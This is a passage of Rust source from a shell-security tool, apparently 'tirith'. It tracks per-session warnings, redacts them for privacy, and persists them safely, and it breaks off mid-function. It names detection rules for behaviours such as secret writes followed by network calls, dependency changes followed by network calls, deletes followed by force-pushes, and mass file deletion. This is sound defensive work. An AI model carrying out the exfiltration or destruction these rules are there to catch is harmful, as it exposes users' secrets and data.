//! Per-session warning accumulator: tracks warnings across commands within a
//! shell session so escalation rules can detect repeated suspicious behavior.
//!
//! State is JSON at `state_dir()/sessions/{session_id}.json`. All I/O is
//! best-effort: failures never alter the verdict or panic.

use std::collections::{BTreeMap, VecDeque};
use std::fmt;
use std::fs::{self, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};

use fs2::FileExt;
use serde::de::Error as _;
use serde::{Deserialize, Deserializer, Serialize, Serializer};

use crate::verdict::{Evidence, Finding};

/// Maximum warning events retained per session.
pub(crate) const MAX_EVENTS: usize = 100;
/// Maximum escalation events retained per session.
pub(crate) const MAX_ESCALATION_EVENTS: usize = 20;
/// Maximum hidden events retained per session.
const MAX_HIDDEN_EVENTS: usize = 50;
/// W7: maximum typed events retained per session for cross-event correlation.
pub(crate) const MAX_TYPED_EVENTS: usize = 200;
/// W7: pathological-growth BACKSTOP for surfaced-correlation signatures. The
/// primary eviction is now lockstep with the event window (a marker is dropped
/// only once none of its source timestamps remain among the live `typed_events`;
/// see [`correlate_session`]), so this cap is a safety ceiling, NOT the dedup
/// boundary. It is sized well above the number of distinct correlations a
/// [`MAX_TYPED_EVENTS`]-event window can produce so it never evicts a marker whose
/// source events are still in-window (which would let the same hit re-emit).
pub(crate) const MAX_SURFACED_CORRELATIONS: usize = MAX_TYPED_EVENTS * 4;
const MAX_COOLDOWNS: usize = 512;
const MAX_WARNING_DOMAINS: usize = 32;
const MAX_TIMESTAMP_BYTES: usize = 64;
const MAX_RULE_ID_BYTES: usize = 128;
const MAX_SEVERITY_BYTES: usize = 32;
const MAX_TITLE_BYTES: usize = 120;
const MAX_COMMAND_PREVIEW_BYTES: usize = 120;
const MAX_DOMAIN_BYTES: usize = 255;
const MAX_COOLDOWN_KEY_BYTES: usize = 512;
const MAX_COOLDOWN_VALUE_BYTES: usize = 64;
const MAX_CORRELATION_SIGNATURE_BYTES: usize = 512;
const MAX_CORRELATION_SOURCES: usize = 4;
const PRIVACY_REDACTED_SESSION_ID: &str = "privacy-redacted";
const PRIVACY_UNSAFE_SESSION_DIAGNOSTIC: &str =
    "tirith: session: refusing privacy-unsafe session identity";

/// Per-session warning accumulator.
#[derive(Clone)]
pub struct SessionWarnings {
    pub session_id: String,
    pub session_start: String,
    pub total_warnings: u32,
    /// Aggregate hidden findings (for backward compat / quick total).
    pub hidden_findings: u32,
    /// Hidden findings broken down by severity (recorded at detection time).
    pub hidden_low: u32,
    pub hidden_info: u32,
    pub events: VecDeque<WarningEvent>,
    /// Escalation events: records when an escalation rule fired, scoped per
    /// (rule_id, domain) key. Used for cooldown matching.
    pub escalation_events: VecDeque<EscalationEvent>,
    /// Findings hidden by paranoia filtering, for `tirith warnings --hidden`.
    pub hidden_events: VecDeque<HiddenEvent>,
    /// W6 — per-rule suppression cooldowns: `rule_key -> expires_at` (RFC3339).
    /// Session-backed so one-shot CLI / hook processes honor a cooldown that an
    /// earlier invocation started.
    pub cooldowns: std::collections::BTreeMap<String, String>,
    /// W7: bounded ring of typed events for cross-event correlation. Recorded
    /// only after the caller confirms execution (and only for security-relevant
    /// signals); pre-execution checks use a provisional, non-persisted event view.
    /// Off the hot path; capped to [`MAX_TYPED_EVENTS`].
    pub typed_events: VecDeque<crate::event_buffer::TypedEvent>,
    /// Next stable sequence for a confirmed typed event. Zero is accepted only
    /// while loading legacy state and is repaired before use.
    pub next_typed_event_sequence: u64,
    /// W7: signatures of correlation hits already added to session warning
    /// presentation/accounting, so a hit whose A-then-B pair (or delete burst) is
    /// still inside its window is counted there exactly once. Enforcement ignores
    /// this de-dup set and evaluates every provisional attempt. Expired in LOCKSTEP
    /// with the event window:
    /// a signature is retained while ANY of its source event timestamps remain among
    /// the live [`typed_events`](Self::typed_events), and dropped once they have all
    /// aged out (see [`correlate_session`]). [`MAX_SURFACED_CORRELATIONS`] is only a
    /// pathological-growth backstop, not the dedup boundary.
    pub surfaced_correlations: VecDeque<String>,
}

/// A single warning event within a session.
#[derive(Clone, PartialEq, Eq)]
pub struct WarningEvent {
    pub timestamp: String,
    pub rule_id: String,
    pub severity: String,
    pub title: String,
    pub command_redacted: String,
    pub domains: Vec<String>,
}

/// Records when an escalation rule fired, for cooldown scoping. `rule_id` is the
/// crossing rule or `"*"` for aggregate; `domain` is set only for
/// `domain_scoped` rules (one domain's escalation doesn't cool down others).
#[derive(Clone, PartialEq, Eq)]
pub struct EscalationEvent {
    pub timestamp: String,
    pub rule_id: String,
    pub domain: Option<String>,
}

/// A finding that was hidden by paranoia filtering (recorded for `tirith warnings --hidden`).
#[derive(Clone)]
pub struct HiddenEvent {
    pub timestamp: String,
    pub rule_id: String,
    pub severity: String,
    pub title: String,
    pub command_redacted: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename = "SessionWarnings")]
struct SessionWarningsWire {
    session_id: String,
    session_start: String,
    total_warnings: u32,
    #[serde(default)]
    hidden_findings: u32,
    #[serde(default)]
    hidden_low: u32,
    #[serde(default)]
    hidden_info: u32,
    events: VecDeque<WarningEvent>,
    #[serde(default)]
    escalation_events: VecDeque<EscalationEvent>,
    #[serde(default)]
    hidden_events: VecDeque<HiddenEvent>,
    #[serde(default)]
    cooldowns: BTreeMap<String, String>,
    #[serde(default)]
    typed_events: VecDeque<crate::event_buffer::TypedEvent>,
    #[serde(default)]
    next_typed_event_sequence: u64,
    #[serde(default)]
    surfaced_correlations: VecDeque<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename = "WarningEvent")]
struct WarningEventWire {
    timestamp: String,
    rule_id: String,
    severity: String,
    title: String,
    command_redacted: String,
    domains: Vec<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename = "EscalationEvent")]
struct EscalationEventWire {
    timestamp: String,
    rule_id: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    domain: Option<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename = "HiddenEvent")]
struct HiddenEventWire {
    timestamp: String,
    rule_id: String,
    severity: String,
    title: String,
    command_redacted: String,
}

impl From<SessionWarningsWire> for SessionWarnings {
    fn from(wire: SessionWarningsWire) -> Self {
        Self {
            session_id: wire.session_id,
            session_start: wire.session_start,
            total_warnings: wire.total_warnings,
            hidden_findings: wire.hidden_findings,
            hidden_low: wire.hidden_low,
            hidden_info: wire.hidden_info,
            events: wire.events,
            escalation_events: wire.escalation_events,
            hidden_events: wire.hidden_events,
            cooldowns: wire.cooldowns,
            typed_events: wire.typed_events,
            next_typed_event_sequence: wire.next_typed_event_sequence,
            surfaced_correlations: wire.surfaced_correlations,
        }
    }
}

impl From<SessionWarnings> for SessionWarningsWire {
    fn from(session: SessionWarnings) -> Self {
        Self {
            session_id: session.session_id,
            session_start: session.session_start,
            total_warnings: session.total_warnings,
            hidden_findings: session.hidden_findings,
            hidden_low: session.hidden_low,
            hidden_info: session.hidden_info,
            events: session.events,
            escalation_events: session.escalation_events,
            hidden_events: session.hidden_events,
            cooldowns: session.cooldowns,
            typed_events: session.typed_events,
            next_typed_event_sequence: session.next_typed_event_sequence,
            surfaced_correlations: session.surfaced_correlations,
        }
    }
}

impl From<WarningEventWire> for WarningEvent {
    fn from(wire: WarningEventWire) -> Self {
        Self {
            timestamp: wire.timestamp,
            rule_id: wire.rule_id,
            severity: wire.severity,
            title: wire.title,
            command_redacted: wire.command_redacted,
            domains: wire.domains,
        }
    }
}

impl From<WarningEvent> for WarningEventWire {
    fn from(event: WarningEvent) -> Self {
        Self {
            timestamp: event.timestamp,
            rule_id: event.rule_id,
            severity: event.severity,
            title: event.title,
            command_redacted: event.command_redacted,
            domains: event.domains,
        }
    }
}

impl From<EscalationEventWire> for EscalationEvent {
    fn from(wire: EscalationEventWire) -> Self {
        Self {
            timestamp: wire.timestamp,
            rule_id: wire.rule_id,
            domain: wire.domain,
        }
    }
}

impl From<EscalationEvent> for EscalationEventWire {
    fn from(event: EscalationEvent) -> Self {
        Self {
            timestamp: event.timestamp,
            rule_id: event.rule_id,
            domain: event.domain,
        }
    }
}

impl From<HiddenEventWire> for HiddenEvent {
    fn from(wire: HiddenEventWire) -> Self {
        Self {
            timestamp: wire.timestamp,
            rule_id: wire.rule_id,
            severity: wire.severity,
            title: wire.title,
            command_redacted: wire.command_redacted,
        }
    }
}

impl From<HiddenEvent> for HiddenEventWire {
    fn from(event: HiddenEvent) -> Self {
        Self {
            timestamp: event.timestamp,
            rule_id: event.rule_id,
            severity: event.severity,
            title: event.title,
            command_redacted: event.command_redacted,
        }
    }
}

fn privacy_project_bounded_text(value: &str, max_bytes: usize) -> String {
    let projected = crate::redact::privacy_project_durable_text(value);
    let projected = crate::mcp::output_filter::sanitize_for_display(&projected);
    crate::util::truncate_bytes(&projected, max_bytes)
}

fn privacy_project_domain(value: &str) -> String {
    crate::util::truncate_bytes(
        &crate::event_buffer::privacy_project_endpoint(value).to_lowercase(),
        MAX_DOMAIN_BYTES,
    )
}

fn privacy_project_session_id(value: &str) -> String {
    if crate::session::is_valid_session_id(value) {
        value.to_string()
    } else {
        PRIVACY_REDACTED_SESSION_ID.to_string()
    }
}

fn privacy_project_warning_event(event: &mut WarningEvent) {
    event.timestamp = privacy_project_bounded_text(&event.timestamp, MAX_TIMESTAMP_BYTES);
    event.rule_id = privacy_project_bounded_text(&event.rule_id, MAX_RULE_ID_BYTES);
    event.severity = privacy_project_bounded_text(&event.severity, MAX_SEVERITY_BYTES);
    event.title = privacy_project_bounded_text(&event.title, MAX_TITLE_BYTES);
    event.command_redacted =
        privacy_project_bounded_text(&event.command_redacted, MAX_COMMAND_PREVIEW_BYTES);
    event.domains = std::mem::take(&mut event.domains)
        .into_iter()
        .map(|domain| privacy_project_domain(&domain))
        .filter(|domain| !domain.is_empty())
        .collect();
    event.domains.sort();
    event.domains.dedup();
    event.domains.truncate(MAX_WARNING_DOMAINS);
}

fn privacy_project_escalation_event(event: &mut EscalationEvent) {
    event.timestamp = privacy_project_bounded_text(&event.timestamp, MAX_TIMESTAMP_BYTES);
    event.rule_id = privacy_project_bounded_text(&event.rule_id, MAX_RULE_ID_BYTES);
    event.domain = event
        .domain
        .take()
        .map(|domain| privacy_project_domain(&domain));
}

fn privacy_project_hidden_event(event: &mut HiddenEvent) {
    event.timestamp = privacy_project_bounded_text(&event.timestamp, MAX_TIMESTAMP_BYTES);
    event.rule_id = privacy_project_bounded_text(&event.rule_id, MAX_RULE_ID_BYTES);
    event.severity = privacy_project_bounded_text(&event.severity, MAX_SEVERITY_BYTES);
    event.title = privacy_project_bounded_text(&event.title, MAX_TITLE_BYTES);
    event.command_redacted =
        privacy_project_bounded_text(&event.command_redacted, MAX_COMMAND_PREVIEW_BYTES);
}

fn validate_warning_event_input(event: &WarningEvent) -> Result<(), &'static str> {
    let projected_rule = privacy_project_bounded_text(&event.rule_id, MAX_RULE_ID_BYTES);
    if event.timestamp.len() > MAX_TIMESTAMP_BYTES
        || event.rule_id.is_empty()
        || projected_rule.is_empty()
        || event.rule_id.len() > MAX_RULE_ID_BYTES
        || event.severity.len() > MAX_SEVERITY_BYTES
        || event.title.len() > MAX_TITLE_BYTES
        || event.command_redacted.len() > MAX_COMMAND_PREVIEW_BYTES
        || event.domains.len() > MAX_WARNING_DOMAINS
        || event
            .domains
            .iter()
            .any(|domain| domain.len() > MAX_DOMAIN_BYTES)
    {
        Err("warning event exceeds its public semantic bounds")
    } else {
        Ok(())
    }
}

fn validate_escalation_event_input(event: &EscalationEvent) -> Result<(), &'static str> {
    let projected_rule = privacy_project_bounded_text(&event.rule_id, MAX_RULE_ID_BYTES);
    if event.timestamp.len() > MAX_TIMESTAMP_BYTES
        || event.rule_id.is_empty()
        || projected_rule.is_empty()
        || event.rule_id.len() > MAX_RULE_ID_BYTES
        || event
            .domain
            .as_ref()
            .is_some_and(|domain| domain.len() > MAX_DOMAIN_BYTES)
    {
        Err("escalation event exceeds its public semantic bounds")
    } else {
        Ok(())
    }
}

fn validate_hidden_event_input(event: &HiddenEvent) -> Result<(), &'static str> {
    let projected_rule = privacy_project_bounded_text(&event.rule_id, MAX_RULE_ID_BYTES);
    if event.timestamp.len() > MAX_TIMESTAMP_BYTES
        || event.rule_id.is_empty()
        || projected_rule.is_empty()
        || event.rule_id.len() > MAX_RULE_ID_BYTES
        || event.severity.len() > MAX_SEVERITY_BYTES
        || event.title.len() > MAX_TITLE_BYTES
        || event.command_redacted.len() > MAX_COMMAND_PREVIEW_BYTES
    {
        Err("hidden event exceeds its public semantic bounds")
    } else {
        Ok(())
    }
}

#[derive(Clone)]
struct EventIdentityProjection {
    sequence: u64,
    old_id: String,
    new_id: String,
    old_timestamp: String,
    new_timestamp: String,
}

fn privacy_project_correlation_signature(
    signature: &str,
    events: &VecDeque<crate::event_buffer::TypedEvent>,
    identities: &[EventIdentityProjection],
) -> Option<String> {
    if signature.is_empty() || signature.len() > MAX_CORRELATION_SIGNATURE_BYTES {
        return None;
    }
    if privacy_project_bounded_text(signature, MAX_CORRELATION_SIGNATURE_BYTES) != signature {
        return None;
    }
    let mut parts = signature.split('|');
    let rule = parts.next()?;
    if !matches!(
        rule,
        "SecretWriteThenNetwork"
            | "DependencyChangeThenNetwork"
            | "DeleteThenForcePush"
            | "MassFileDeletion"
    ) {
        return None;
    }

    let mut rebuilt = rule.to_string();
    let mut source_count = 0usize;
    for part in parts {
        source_count += 1;
        if source_count > MAX_CORRELATION_SOURCES {
            return None;
        }
        rebuilt.push('|');
        if let Some(encoded) = part.strip_prefix("e:") {
            let (event_id, sequence) = encoded.rsplit_once(':')?;
            let sequence = sequence.parse::<u64>().ok()?;
            let current = identities.iter().find(|identity| {
                identity.sequence == sequence && identity.old_id.as_str() == event_id
            });
            let event_id = current.map_or(event_id, |identity| identity.new_id.as_str());
            if event_id.is_empty()
                || !events
                    .iter()
                    .any(|event| event.sequence == sequence && event.event_id == event_id)
            {
                return None;
            }
            rebuilt.push_str("e:");
            rebuilt.push_str(event_id);
            rebuilt.push(':');
            rebuilt.push_str(&sequence.to_string());
        } else {
            let prefix = if part.starts_with("t:") { "t:" } else { "" };
            let timestamp = part.strip_prefix("t:").unwrap_or(part);
            let timestamp = identities
                .iter()
                .find(|identity| identity.old_timestamp == timestamp)
                .map_or(timestamp, |identity| identity.new_timestamp.as_str());
            if !events.iter().any(|event| event.timestamp == timestamp) {
                return None;
            }
            rebuilt.push_str(prefix);
            rebuilt.push_str(timestamp);
        }
    }
    (source_count > 0 && rebuilt.len() <= MAX_CORRELATION_SIGNATURE_BYTES).then_some(rebuilt)
}

/// Project the complete public/persisted session graph. This is idempotent and
/// runs at every direct serde/debug boundary as well as after a locked mutation,
/// immediately before persistence.
fn privacy_project_session_state(session: &mut SessionWarnings) {
    session.session_id = privacy_project_session_id(&session.session_id);
    session.session_start = privacy_project_bounded_text(&session.session_start, 64);

    for event in &mut session.events {
        privacy_project_warning_event(event);
    }
    while session.events.len() > MAX_EVENTS {
        session.events.pop_front();
    }
    for event in &mut session.escalation_events {
        privacy_project_escalation_event(event);
    }
    while session.escalation_events.len() > MAX_ESCALATION_EVENTS {
        session.escalation_events.pop_front();
    }
    for event in &mut session.hidden_events {
        privacy_project_hidden_event(event);
    }
    while session.hidden_events.len() > MAX_HIDDEN_EVENTS {
        session.hidden_events.pop_front();
    }

    let mut cooldowns = BTreeMap::new();
    for (key, value) in std::mem::take(&mut session.cooldowns) {
        let (key, value) = crate::redact::privacy_project_durable_pair(&key, &value);
        let key = privacy_project_bounded_text(&key, MAX_COOLDOWN_KEY_BYTES);
        if key.is_empty() {
            continue;
        }
        let value = privacy_project_bounded_text(&value, MAX_COOLDOWN_VALUE_BYTES);
        cooldowns.insert(key, value);
        if cooldowns.len() >= MAX_COOLDOWNS {
            break;
        }
    }
    session.cooldowns = cooldowns;

    let mut identities = Vec::with_capacity(session.typed_events.len().min(MAX_TYPED_EVENTS));
    for event in &mut session.typed_events {
        let old_id = event.event_id.clone();
        let old_timestamp = event.timestamp.clone();
        crate::event_buffer::privacy_project_typed_event(event);
        if event.sequence == 0 {
            event.event_id.clear();
        } else {
            // Presentation state accepts an id only when it is reproducibly
            // derived from the current projected source. This prevents an
            // attacker-provided digest from becoming a durable oracle.
            event.event_id.clear();
            event.migrate_legacy_identity(&session.session_id, event.sequence);
        }
        identities.push(EventIdentityProjection {
            sequence: event.sequence,
            old_id,
            new_id: event.event_id.clone(),
            old_timestamp,
            new_timestamp: event.timestamp.clone(),
        });
    }
    while session.typed_events.len() > MAX_TYPED_EVENTS {
        session.typed_events.pop_front();
    }

    let mut correlations: VecDeque<String> = std::mem::take(&mut session.surfaced_correlations)
        .into_iter()
        .filter_map(|signature| {
            privacy_project_correlation_signature(&signature, &session.typed_events, &identities)
        })
        .collect();
    while correlations.len() > MAX_SURFACED_CORRELATIONS {
        correlations.pop_front();
    }
    session.surfaced_correlations = correlations;
}

impl Serialize for SessionWarnings {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        let mut projected = self.clone();
        privacy_project_session_state(&mut projected);
        SessionWarningsWire::from(projected).serialize(serializer)
    }
}

impl<'de> Deserialize<'de> for SessionWarnings {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        let wire = SessionWarningsWire::deserialize(deserializer)?;
        let mut typed_sequences = std::collections::HashSet::new();
        let mut typed_ids = std::collections::HashSet::new();
        let duplicate_typed_identity = wire.typed_events.iter().any(|event| {
            (event.sequence != 0 && !typed_sequences.insert(event.sequence))
                || (!event.event_id.is_empty() && !typed_ids.insert(event.event_id.clone()))
        });
        if wire.session_id.is_empty()
            || wire.session_id.len() > 128
            || wire.session_start.len() > MAX_TIMESTAMP_BYTES
            || wire.events.len() > MAX_EVENTS
            || wire.escalation_events.len() > MAX_ESCALATION_EVENTS
            || wire.hidden_events.len() > MAX_HIDDEN_EVENTS
            || wire.cooldowns.len() > MAX_COOLDOWNS
            || wire.cooldowns.iter().any(|(key, value)| {
                key.is_empty()
                    || key.len() > MAX_COOLDOWN_KEY_BYTES
                    || value.len() > MAX_COOLDOWN_VALUE_BYTES
            })
            || wire.typed_events.len() > MAX_TYPED_EVENTS
            || duplicate_typed_identity
            || wire.surfaced_correlations.len() > MAX_SURFACED_CORRELATIONS
            || wire.surfaced_correlations.iter().any(|signature| {
                signature.is_empty() || signature.len() > MAX_CORRELATION_SIGNATURE_BYTES
            })
        {
            return Err(D::Error::custom(
                "session warnings exceed their public semantic bounds",
            ));
        }
        let mut session = Self::from(wire);
        privacy_project_session_state(&mut session);
        Ok(session)
    }
}

impl fmt::Debug for SessionWarnings {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        let mut projected = self.clone();
        privacy_project_session_state(&mut projected);
        formatter
            .debug_struct("SessionWarnings")
            .field("session_id", &projected.session_id)
            .field("session_start", &projected.session_start)
            .field("total_warnings", &projected.total_warnings)
            .field("hidden_findings", &projected.hidden_findings)
            .field("hidden_low", &projected.hidden_low)
            .field("hidden_info", &projected.hidden_info)
            .field("events", &projected.events)
            .field("escalation_events", &projected.escalation_events)
            .field("hidden_events", &projected.hidden_events)
            .field("cooldowns", &projected.cooldowns)
            .field("typed_events", &projected.typed_events)
            .field(
                "next_typed_event_sequence",
                &projected.next_typed_event_sequence,
            )
            .field("surfaced_correlations", &projected.surfaced_correlations)
            .finish()
    }
}

macro_rules! privacy_projected_event_traits {
    ($event:ty, $wire:ty, $project:path, $validate:path, $name:literal, {$($field:ident),+ $(,)?}) => {
        impl Serialize for $event {
            fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
            where
                S: Serializer,
            {
                let mut projected = self.clone();
                $project(&mut projected);
                <$wire>::from(projected).serialize(serializer)
            }
        }

        impl<'de> Deserialize<'de> for $event {
            fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
            where
                D: Deserializer<'de>,
            {
                let event = Self::from(<$wire>::deserialize(deserializer)?);
                $validate(&event).map_err(D::Error::custom)?;
                let mut event = event;
                $project(&mut event);
                Ok(event)
            }
        }

        impl fmt::Debug for $event {
            fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
                let mut projected = self.clone();
                $project(&mut projected);
                formatter
                    .debug_struct($name)
                    $(.field(stringify!($field), &projected.$field))+
                    .finish()
            }
        }
    };
}

privacy_projected_event_traits!(
    WarningEvent,
    WarningEventWire,
    privacy_project_warning_event,
    validate_warning_event_input,
    "WarningEvent",
    {timestamp, rule_id, severity, title, command_redacted, domains}
);
privacy_projected_event_traits!(
    EscalationEvent,
    EscalationEventWire,
    privacy_project_escalation_event,
    validate_escalation_event_input,
    "EscalationEvent",
    {timestamp, rule_id, domain}
);
privacy_projected_event_traits!(
    HiddenEvent,
    HiddenEventWire,
    privacy_project_hidden_event,
    validate_hidden_event_input,
    "HiddenEvent",
    {timestamp, rule_id, severity, title, command_redacted}
);

impl SessionWarnings {
    /// Create a new empty accumulator.
    pub(crate) fn new(session_id: &str) -> Self {
        Self {
            session_id: session_id.to_string(),
            session_start: chrono::Utc::now().to_rfc3339(),
            total_warnings: 0,
            hidden_findings: 0,
            hidden_low: 0,
            hidden_info: 0,
            events: VecDeque::new(),
            escalation_events: VecDeque::new(),
            hidden_events: VecDeque::new(),
            cooldowns: std::collections::BTreeMap::new(),
            typed_events: VecDeque::new(),
            next_typed_event_sequence: 1,
            surfaced_correlations: VecDeque::new(),
        }
    }

    /// Count events matching `rule_id` within the last `window_minutes`.
    pub fn count_by_rule(&self, rule_id: &str, window_minutes: u64) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        self.events
            .iter()
            .filter(|e| e.rule_id == rule_id && e.timestamp.as_str() >= cutoff.as_str())
            .count() as u32
    }

    /// Count events matching both `rule_id` and `domain` within the window.
    pub fn count_by_rule_and_domain(
        &self,
        rule_id: &str,
        domain: &str,
        window_minutes: u64,
    ) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        let domain_lower = domain.to_lowercase();
        self.events
            .iter()
            .filter(|e| {
                e.rule_id == rule_id
                    && e.timestamp.as_str() >= cutoff.as_str()
                    && e.domains.iter().any(|d| d.to_lowercase() == domain_lower)
            })
            .count() as u32
    }

    /// Count all events within the window.
    pub fn count_all(&self, window_minutes: u64) -> u32 {
        let cutoff = cutoff_time(window_minutes);
        self.events
            .iter()
            .filter(|e| e.timestamp.as_str() >= cutoff.as_str())
            .count() as u32
    }

    /// Top rules by frequency (descending).
    pub fn top_rules(&self) -> Vec<(String, u32)> {
        let mut counts = std::collections::HashMap::<String, u32>::new();
        for e in &self.events {
            *counts.entry(e.rule_id.clone()).or_default() += 1;
        }
        let mut sorted: Vec<_> = counts.into_iter().collect();
        sorted.sort_by_key(|s| std::cmp::Reverse(s.1));
        sorted
    }
}

/// Compute the RFC 3339 cutoff timestamp for windowed queries.
fn cutoff_time(window_minutes: u64) -> String {
    let cutoff =
        chrono::Utc::now() - chrono::Duration::minutes(window_minutes.min(u32::MAX as u64) as i64);
    cutoff.to_rfc3339()
}

/// Validate session_id and return the state file path.
///
/// Session IDs must be non-empty, <=128 chars, contain only `[a-zA-Z0-9_-]`,
/// and survive mandatory durable-secret projection unchanged. The shared
/// resolver predicate therefore prevents both traversal and secret-bearing
/// state/lock filenames.
pub fn session_state_path(session_id: &str) -> Option<PathBuf> {
    // repo-0339: one shared privacy-safe predicate with the session resolver, so
    // an ID the resolver accepted is always storable.
    if !crate::session::is_valid_session_id(session_id) {
        return None;
    }
    let state = crate::policy::state_dir()?;
    Some(state.join("sessions").join(format!("{session_id}.json")))
}

/// Path to the cross-process lock file guarding a session: `<session_id>.json.lock`.
///
/// A DEDICATED lock file (stable inode) is locked rather than the session JSON
/// itself, because [`with_session_locked`] now replaces the data file via an atomic
/// temp+rename. Locking the data file and then renaming over it would leave the
/// lock on the stale (old) inode, so a second writer could acquire the lock on the
/// new inode and clobber the first. Locking a separate file that is never renamed
/// keeps writers serialized across the whole read/modify/write while the rename
/// stays crash-atomic. Mirrors the pending store's `pending.json.lock`.
pub(crate) fn session_lock_path(session_id: &str) -> Option<PathBuf> {
    session_state_path(session_id).map(|p| {
        let mut name = p.file_name().unwrap_or_default().to_os_string();
        name.push(".lock");
        p.with_file_name(name)
    })
}

/// Upper bound on a session JSON we will read. A real session (bounded warning
/// events, cooldowns, and a 200-entry typed-event ring) is far smaller; the cap
/// bounds the read so a malicious or runaway file is not slurped, and pairs with the
/// regular-file + no-follow refusal in [`crate::util::read_text_no_follow_capped`].
pub(crate) const SESSION_FILE_READ_CAP: u64 = 8 * 1024 * 1024;

fn ensure_private_session_directory(directory: &Path) -> std::io::Result<()> {
    crate::util::create_dir_durable(directory)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::{MetadataExt as _, PermissionsExt as _};
        let metadata = fs::symlink_metadata(directory)?;
        if metadata.file_type().is_symlink() || !metadata.is_dir() {
            return Err(std::io::Error::other(
                "session state path is not a real directory",
            ));
        }
        if metadata.uid() != unsafe { libc::geteuid() } {
            return Err(std::io::Error::new(
                std::io::ErrorKind::PermissionDenied,
                "session state directory has the wrong owner",
            ));
        }
        if metadata.mode() & 0o077 != 0 {
            fs::set_permissions(directory, fs::Permissions::from_mode(0o700))?;
            crate::util::fsync_parent_dir(directory)?;
        }
    }
    Ok(())
}

/// Load session warnings from disk; a fresh (empty) accumulator on any error.
///
/// Reads via [`crate::util::read_text_no_follow_capped`] (the same helper the policy
/// and scan read paths use): O_NOFOLLOW refuses a symlinked session file, O_NONBLOCK
/// plus an fd-based regular-file check refuses a FIFO / device / socket (so a planted
/// non-regular file cannot hang `tirith warnings`), and a size cap refuses an
/// oversized file before any read. `with_session_locked` writes via an atomic
/// temp+rename, so a reader sees a complete old-or-new file and needs no shared lock
/// to avoid a transient empty state.
pub fn load(session_id: &str) -> SessionWarnings {
    if privacy_project_session_id(session_id) != session_id {
        crate::audit::audit_diagnostic(PRIVACY_UNSAFE_SESSION_DIAGNOSTIC);
        return SessionWarnings::new(PRIVACY_REDACTED_SESSION_ID);
    }
    let path = match session_state_path(session_id) {
        Some(p) => p,
        None => return SessionWarnings::new(session_id),
    };

    let bytes = match crate::util::read_text_no_follow_capped(&path, SESSION_FILE_READ_CAP) {
        Ok(b) => b,
        // Missing is the normal "no session yet" (silent).
        Err(crate::util::OpenRegularError::NotFound) => return SessionWarnings::new(session_id),
        // A symlink / FIFO / device / oversized / unreadable file: never block, never
        // read a foreign inode; degrade to a fresh accumulator with a diagnostic.
        Err(_) => {
            crate::audit::audit_diagnostic(format!(
                "tirith: session: refusing non-regular, oversized, or unreadable {}; using fresh state",
                path.display()
            ));
            return SessionWarnings::new(session_id);
        }
    };
    if bytes.is_empty() {
        return SessionWarnings::new(session_id);
    }
    let mut session = serde_json::from_slice::<SessionWarnings>(&bytes).unwrap_or_else(|e| {
        crate::audit::audit_diagnostic(format!(
            "tirith: session: corrupt state for '{session_id}': {e}; resetting"
        ));
        SessionWarnings::new(session_id)
    });
    migrate_typed_event_identities(&mut session);
    session
}

/// Assign stable identities to legacy typed events without colliding with
/// already-migrated/new sequences. Runs only while the caller owns a private
/// value or the stable session lock.
pub(crate) fn migrate_typed_event_identities(session: &mut SessionWarnings) {
    let mut used_sequences = std::collections::HashSet::new();
    let mut max_sequence = 0u64;
    for event in &mut session.typed_events {
        if event.sequence == 0 || !used_sequences.insert(event.sequence) {
            event.sequence = 0;
        } else {
            max_sequence = max_sequence.max(event.sequence);
        }
    }

    let mut used_ids = std::collections::HashSet::new();

    let mut next = max_sequence.checked_add(1).unwrap_or(0);
    for event in &mut session.typed_events {
        if event.sequence == 0 {
            if next == 0 {
                // Leave the legacy sentinel in place. Strict authorization will
                // reject exhausted state; best-effort presentation must never
                // wrap a supposedly monotonic security sequence back to one.
                continue;
            }
            event.migrate_legacy_identity(&session.session_id, next);
            used_sequences.insert(event.sequence);
            next = next.checked_add(1).unwrap_or(0);
        } else if event.event_id.is_empty() {
            event.migrate_legacy_identity(&session.session_id, event.sequence);
        }
        if !event.event_id.is_empty() && used_ids.contains(&event.event_id) {
            let mut replacement = None;
            for collision in 1..=used_ids.len().saturating_add(1) {
                // Sequence and bounded ordinal are already unique, non-secret
                // state. Do not hash the colliding attacker-controlled id: a
                // digest would preserve an offline oracle after raw text was
                // projected away.
                let candidate = format!("legacy-event-{}-collision-{collision}", event.sequence);
                if !used_ids.contains(&candidate) {
                    replacement = Some(candidate);
                    break;
                }
            }
            match replacement {
                Some(candidate) => {
                    event.event_id = candidate;
                }
                None => {
                    event.event_id.clear();
                }
            }
        }
        if !event.event_id.is_empty() {
            used_ids.insert(event.event_id.clone());
        }
    }
    if next != 0 {
        session.next_typed_event_sequence = session.next_typed_event_sequence.max(next).max(1);
    }
}

/// Find a non-zero sequence in at most `used.len() + 1` probes. Wrapping after
/// `u64::MAX` is safe because a finite in-memory ring cannot occupy the entire
/// sequence space; the bound prevents hostile state from causing an infinite
/// loop.
fn next_free_typed_sequence(used: &std::collections::HashSet<u64>, start: u64) -> Option<u64> {
    let mut candidate = start.max(1);
    for _ in 0..=used.len() {
        if !used.contains(&candidate) {
            return Some(candidate);
        }
        candidate = candidate.checked_add(1)?;
    }
    None
}

fn assign_typed_event_identity(
    session: &mut SessionWarnings,
    event: &mut crate::event_buffer::TypedEvent,
) -> bool {
    migrate_typed_event_identities(session);
    let used: std::collections::HashSet<u64> = session
        .typed_events
        .iter()
        .map(|existing| existing.sequence)
        .collect();
    let Some(sequence) = next_free_typed_sequence(&used, session.next_typed_event_sequence) else {
        return false;
    };
    event.sequence = sequence;
    if event.event_id.is_empty()
        || session
            .typed_events
            .iter()
            .any(|existing| existing.event_id == event.event_id)
    {
        event.event_id.clear();
        event.migrate_legacy_identity(&session.session_id, sequence);
